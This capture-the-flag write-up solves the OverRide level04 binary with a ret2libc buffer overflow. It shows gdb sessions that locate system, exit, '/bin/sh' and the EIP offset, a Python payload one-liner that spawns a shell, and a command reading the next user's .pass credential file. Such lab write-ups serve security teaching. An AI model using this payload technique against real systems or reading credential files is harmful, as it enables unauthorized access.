# level04

In this program, we have an unsafe `gets` call used in the child process after a`fork`.
Even though the program mentions shellcode, we’re going to try something else: a **ret2libc attack**.

The concept is simple: we overwrite the return address (EIP) with the address of `system` and supply `/bin/sh` (or another command) as its argument. The attack requires:

- The address of system
- A return address (e.g., the address of exit)
- A memory location where the string /bin/sh resides

Let's find those with *gdb*. For system and exit, this is straightforward:

```bash
level04@OverRide:~$ gdb -q level04
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80486cd
(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```

To locate /bin/sh in memory, we’ll search through libc:

```bash
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

Pretty aggresive I'll admit, but it's fast.
If it weren’t found, we could inject it via an environment variable.

Now we'll use our pattern generator to determine the offset at which EIP is overwritten.
Because the `gets` call happens in the child process, we need to follow the child in *gdb*:

```bash
(gdb) set follow-fork-mode child
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level04/level04

[New process 1939]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1939]
0x41326641 in ?? ()
```

This tells us that the offset to EIP is 156 bytes.

We’ll build a payload like this:

- 156 bytes of padding
- Address of `system` → `0xf7e6aed0`
- Address of `exit` → `0xf7e5eb70`
- Address of `/bin/sh` → `0xf7f897ec`

Here’s the one-liner:

```bash
(cat <(python -c 'print("a" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")') -) | ./level04
```

Let's get the flag:

```bash
level04@OverRide:~$ (cat <(python -c 'print("a" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")') -) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
<flag>
```
